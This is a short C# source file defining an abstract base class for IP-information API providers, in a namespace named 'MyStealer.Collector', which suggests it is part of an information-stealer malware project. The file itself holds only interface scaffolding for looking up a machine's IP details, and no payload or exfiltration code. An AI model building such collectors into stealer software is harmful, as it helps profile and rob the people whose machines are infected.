using System;

namespace MyStealer.Collector.Ip
{
    /// <summary>
    /// Abstraction layer of various IP information API providers.
    /// </summary>
    public abstract class ApiProviderBase : CollectorBase
    {
        /// <summary>
        /// The api provider URL.
        /// </summary>
        public abstract Uri ApiUrl { get; }

        public override bool IsAvailable() => true;

        /// <summary>
        /// Parse the API response. This method *may* throw exceptions so you need to handle it properly.
        /// </summary>
        /// <param name="response">The response string to process.</param>
        /// <returns>Parsed response data.</returns>
        public abstract IpDetails Parse(string response);
    }
}
